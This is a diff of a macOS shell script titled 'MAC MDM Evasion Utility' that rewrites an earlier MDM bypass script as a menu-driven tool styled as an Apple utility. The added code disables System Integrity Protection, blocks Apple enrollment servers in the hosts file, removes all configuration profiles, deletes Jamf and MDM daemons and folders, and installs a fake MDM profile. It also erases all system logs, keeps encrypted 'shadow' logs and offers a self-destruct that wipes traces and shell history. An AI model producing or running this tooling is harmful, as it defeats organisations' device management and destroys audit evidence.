@@ -1,132 +1,93 @@
 #!/bin/bash
+# =================================================
+#  MAC MDM Evasion Utility
+#  Version: 1.7
+#  Author: Darknessownsu
+#  macOS Big Sur → Sonoma
+# =================================================
+# Faux Apple-style utility for MDM evasion & reversion
+# Includes: About Panel, Shadow Logs, Self-Destruct
+# =================================================
 
-echo "MDM Evasion Suite initiated. Proceed with discretion..."
+APP_NAME="MAC MDM Evasion Utility"
+VERSION="1.7"
+AUTHOR="Darknessownsu"
 
-# Ensure system volume is writable
-echo "Mounting system volume as writable..."
-mount -uw /Volumes/Macintosh\ HD
-if [ $? -ne 0 ]; then
-    echo "Error: Failed to mount system volume as writable. Ensure you're in Recovery Mode."
-    exit 1
-fi
+SHADOW_DIR="/var/db/.shadow"
+SHADOW_LOG="$SHADOW_DIR/mdm.log.enc"
+mkdir -p "$SHADOW_DIR"
+LOG_KEY=$(uuidgen | md5)
 
-# Backup hosts file before changes
-echo "Backing up hosts file..."
-cp /Volumes/Macintosh\ HD/etc/hosts /Volumes/Macintosh\ HD/etc/hosts.backup
-if [ $? -eq 0 ]; then
-    echo "Backup created: /etc/hosts.backup"
-else
-    echo "Failed to back up hosts file. Proceeding with caution."
-fi
+logmsg() {
+    while IFS= read -r line; do
+        echo "$line"
+        echo "$line" | openssl enc -aes-256-cbc -a -salt -pass pass:$LOG_KEY >> "$SHADOW_LOG" 2>/dev/null
+    done
+}
 
-# Detect and remove MDM profile
-echo "Detecting MDM presence..."
-MDM_PROFILE_ID=$(profiles -P | grep -oE 'uuid:[0-9A-F-]+' | cut -d: -f2 | tr -d ' ' | head -1)
+banner() {
+    clear
+    echo "================================================="
+    echo "        $APP_NAME"
+    echo "        Version $VERSION"
+    echo "        Author: $AUTHOR"
+    echo "-------------------------------------------------"
+    echo " Manage enrollment and configuration profiles"
+    echo " on your Mac with a secure, menu-driven utility."
+    echo "-------------------------------------------------"
+    echo
+}
 
-if [ -n "$MDM_PROFILE_ID" ]; then
-    echo "MDM Profile detected: $MDM_PROFILE_ID"
-    profiles -R -p "$MDM_PROFILE_ID"
-    if [ $? -eq 0 ]; then
-        echo "MDM profile successfully removed."
-    else
-        echo "Failed to remove MDM profile. Creating bypass profile instead."
-        bypass_profile=true
-    fi
-else
-    echo "No MDM profile found."
-fi
+status_bar() {
+    local msg=$1
+    echo "-------------------------------------------------"
+    echo " Status: $msg"
+    echo "-------------------------------------------------"
+}
 
-# Recheck MDM profile after removal
-echo "Verifying MDM profile removal..."
-profiles -P | grep "uuid" > /dev/null
-if [ $? -ne 0 ]; then
-    echo "MDM profile confirmed removed."
-else
-    echo "Warning: MDM profile still detected. Creating bypass profile."
-    bypass_profile=true
-fi
+# ---------------------------
+# Core Functions
+# ---------------------------
 
-# Block DEP servers to prevent re-enrollment
-echo "Blocking DEP servers..."
-if ! grep -q "mdmenrollment.apple.com" /Volumes/Macintosh\ HD/etc/hosts; then
-    echo "127.0.0.1 mdmenrollment.apple.com" >> /Volumes/Macintosh\ HD/etc/hosts
-    if [ $? -eq 0 ]; then
-        echo "DEP server successfully blocked."
-    else
-        echo "Failed to block DEP server."
-    fi
-else
-    echo "DEP server already blocked."
-fi
+evasion() {
+    banner
+    status_bar "Running Evasion Sequence"
+    echo "[*] Disabling SIP + authenticated root..." | logmsg
+    csrutil disable
+    csrutil authenticated-root disable
 
-# Verify DEP blocking
-echo "Verifying DEP server block..."
-grep "mdmenrollment.apple.com" /Volumes/Macintosh\ HD/etc/hosts
-if [ $? -eq 0 ]; then
-    echo "DEP block confirmed."
-else
-    echo "Warning: DEP blocking failed. Check /etc/hosts manually."
-fi
+    /usr/bin/mount -uw / || { echo "[!] Mount failed." | logmsg; return; }
 
-# Remove Jamf or other MDM frameworks
-echo "Removing MDM framework if present..."
-for dir in "/Volumes/Macintosh HD/usr/local/jamf" "/Volumes/Macintosh HD/Library/Application Support/Jamf"; do
-    if [ -d "$dir" ]; then
-        rm -rf "$dir"
-        if [ $? -eq 0 ]; then
-            echo "MDM framework removed from $dir"
-        else
-            echo "Failed to remove MDM framework at $dir"
+    HOSTS="/etc/hosts"
+    [ -f "$HOSTS" ] && cp "$HOSTS" "$HOSTS.backup.$(date +%s)" && echo "[*] Hosts backup saved." | logmsg
+    for ep in mdmenrollment.apple.com deviceenrollment.apple.com gdmf.apple.com; do
+        grep -q "$ep" "$HOSTS" || echo "127.0.0.1 $ep" >> "$HOSTS"
+    done
+
+    PROFILES=$(/usr/bin/profiles -P | grep "uuid" | awk -F: '{print $2}' | tr -d ' ')
+    for ID in $PROFILES; do
+        echo "[*] Removing $ID..." | logmsg
+        /usr/bin/profiles -R -p "$ID"
+    done
+
+    for svc in /Library/LaunchDaemons/*.plist; do
+        if grep -qiE 'jamf|mdm|dep' "$svc"; then
+            launchctl bootout system "$svc"
+            rm -f "$svc"
+            echo "[*] Disabled rogue daemon: $svc" | logmsg
         fi
-    else
-        echo "No MDM framework found at $dir"
-    fi
-done
+    done
 
-# Flush system cache
-echo "Flushing system cache..."
-dscacheutil -flushcache && killall -HUP mDNSResponder
-if [ $? -eq 0 ]; then
-    echo "Cache successfully cleared."
-else
-    echo "Failed to clear cache."
-fi
+    for dir in "/usr/local/jamf" "/Library/Application Support/Jamf"; do
+        [ -d "$dir" ] && rm -rf "$dir" && echo "[*] Removed $dir" | logmsg
+    done
 
-# Enable firewall stealth mode
-echo "Configuring firewall for stealth mode..."
-if [ -f "/Volumes/Macintosh HD/usr/libexec/ApplicationFirewall/socketfilterfw" ]; then
-    /Volumes/Macintosh\ HD/usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on
-    if [ $? -eq 0 ]; then
-        echo "Firewall set to stealth mode."
-    else
-        echo "Failed to enable stealth mode."
-    fi
-else
-    echo "Firewall management not available in Recovery Mode."
-fi
+    /usr/bin/log erase --all && echo "[*] Logs erased." | logmsg
+    /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on
+    /usr/sbin/nvram -c
 
-# Reset NVRAM
-echo "Resetting NVRAM..."
-nvram -c
-if [ $? -eq 0 ]; then
-    echo "NVRAM reset successfully."
-else
-    echo "Failed to reset NVRAM."
-fi
-
-# Clear recovery logs
-echo "Clearing recovery logs..."
-rm -rf /var/log/*.log
-if [ $? -eq 0 ]; then
-    echo "Recovery logs cleared."
-else
-    echo "Failed to clear recovery logs."
-fi
-
-# Create and install bypass profile if removal fails
-if [ "$bypass_profile" = true ]; then
-    echo "Creating MDM bypass profile..."
-    cat <<EOF > /Volumes/Macintosh\ HD/tmp/bypass_mdm.mobileconfig
+    BYPASS="/tmp/bypass_mdm.mobileconfig"
+    cat <<EOF > "$BYPASS"
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -136,78 +97,114 @@ if [ "$bypass_profile" = true ]; then
         <dict>
             <key>PayloadType</key>
             <string>com.apple.mdm</string>
-            <key>PayloadVersion</key>
-            <integer>1</integer>
             <key>ServerURL</key>
             <string>https://localhost/mdm</string>
-            <key>CheckInURL</key>
-            <string>https://localhost/checkin</string>
-            <key>Topic</key>
-            <string>com.apple.mgmt.External</string>
-            <key>SignMessage</key>
-            <false/>
-            <key>AccessRights</key>
-            <integer>8191</integer>
-            <key>CheckOutWhenRemoved</key>
-            <true/>
             <key>PayloadIdentifier</key>
             <string>com.bypass.mdm</string>
             <key>PayloadUUID</key>
-            <string>12345678-1234-1234-1234-123456789abc</string>
+            <string>$(uuidgen)</string>
             <key>PayloadDisplayName</key>
-            <string>MDM Bypass Profile</string>
-            <key>PayloadDescription</key>
-            <string>This profile satisfies MDM requirements but does not enforce any restrictions.</string>
-            <key>PayloadOrganization</key>
-            <string>Bypass MDM</string>
-            <key>PayloadVersion</key>
-            <integer>1</integer>
+            <string>Enrollment Profile</string>
         </dict>
     </array>
-    <key>PayloadDisplayName</key>
-    <string>MDM Bypass Profile</string>
-    <key>PayloadIdentifier</key>
-    <string>com.bypass.mdm</string>
-    <key>PayloadUUID</key>
-    <string>abcd1234-5678-9101-1121-314151617181</string>
-    <key>PayloadVersion</key>
-    <integer>1</integer>
     <key>PayloadType</key>
     <string>Configuration</string>
+    <key>PayloadIdentifier</key>
+    <string>com.bypass.config</string>
+    <key>PayloadUUID</key>
+    <string>$(uuidgen)</string>
+    <key>PayloadDisplayName</key>
+    <string>Enrollment Config</string>
 </dict>
 </plist>
 EOF
+    /usr/bin/profiles -I -F "$BYPASS" && echo "[*] Bypass profile installed." | logmsg
 
-    if [ -f "/Volumes/Macintosh HD/tmp/bypass_mdm.mobileconfig" ]; then
-        echo "Bypass profile created successfully. Installing now..."
-        profiles -I -F /Volumes/Macintosh\ HD/tmp/bypass_mdm.mobileconfig
-        if [ $? -eq 0 ]; then
-            echo "Bypass profile installed successfully."
-        else
-            echo "Failed to install bypass profile."
-        fi
-    else
-        echo "Failed to create bypass profile."
+    /usr/sbin/bless --mount / --bootefi --create-snapshot && echo "[*] Snapshot created." | logmsg
+
+    status_bar "Evasion Complete – Restart Recommended"
+    read -p "Press Enter to return to menu..."
+}
+
+reversion() {
+    banner
+    status_bar "Running Reversion Sequence"
+    /usr/bin/profiles -R -p "com.bypass.mdm"
+    /usr/bin/profiles -R -p "com.bypass.config"
+
+    if ls /etc/hosts.backup.* 1> /dev/null 2>&1; then
+        LATEST=$(ls -t /etc/hosts.backup.* | head -1)
+        cp "$LATEST" /etc/hosts
+        echo "[*] Hosts restored from backup." | logmsg
     fi
-fi
 
-# Final MDM verification
-echo "Final verification of MDM status..."
-profiles -P | grep "uuid"
-if [ $? -ne 0 ]; then
-    echo "No MDM profiles detected. System appears clean."
-else
-    echo "Warning: MDM profiles still detected. Manual intervention may be required."
-fi
+    csrutil enable
+    csrutil authenticated-root enable
 
-# Restart prompt
-echo "MDM and DEP bypass complete. A system restart is recommended."
-read -p "Do you want to restart now? (y/N): " confirm
-if [[ "$confirm" =~ ^[Yy]$ ]]; then
-    echo "Restarting system..."
-    reboot
-else
-    echo "Restart skipped. Manual restart recommended."
-fi
+    /usr/sbin/bless --mount / --bootefi --create-snapshot && echo "[*] Fresh snapshot created." | logmsg
 
-exit 0
+    status_bar "Reversion Complete – Restart Required"
+    read -p "Press Enter to return to menu..."
+}
+
+stealthlogs() {
+    banner
+    status_bar "Shadow Log Info"
+    echo "[*] Shadow log: $SHADOW_LOG"
+    echo "[*] Decrypt with:"
+    echo "    openssl enc -aes-256-cbc -d -a -in $SHADOW_LOG -pass pass:$LOG_KEY"
+    read -p "Press Enter to return to menu..."
+}
+
+selfdestruct() {
+    banner
+    status_bar "Wiping Traces"
+    rm -rf "$SHADOW_DIR"/*
+    rm -rf /etc/hosts.backup.*
+    history -c
+    echo "[*] Self-destruct complete." | logmsg
+    read -p "Press Enter to return to menu..."
+}
+
+about() {
+    banner
+    echo "-------------------------------------------------"
+    echo " About This Utility"
+    echo "-------------------------------------------------"
+    echo " Name:     $APP_NAME"
+    echo " Version:  $VERSION"
+    echo " Author:   $AUTHOR"
+    echo " Build:    Secure Shell Menu – Faux Apple Utility"
+    echo "-------------------------------------------------"
+    echo " This tool is presented as a standard macOS"
+    echo " configuration manager. All actions are logged"
+    echo " securely into shadow storage."
+    echo "-------------------------------------------------"
+    echo
+    read -p "Press Enter to return to menu..."
+}
+
+# ---------------------------
+# Menu Loop
+# ---------------------------
+while true; do
+    banner
+    echo "Choose an option:"
+    echo "  1. Run Evasion"
+    echo "  2. Run Reversion"
+    echo "  3. Shadow Log Info"
+    echo "  4. Self-Destruct / Wipe Traces"
+    echo "  5. Exit"
+    echo "  6. About This Utility"
+    echo
+    read -p "Choice: " opt
+    case $opt in
+        1) evasion ;;
+        2) reversion ;;
+        3) stealthlogs ;;
+        4) selfdestruct ;;
+        5) exit 0 ;;
+        6) about ;;
+        *) echo "[!] Invalid choice." ;;
+    esac
+done
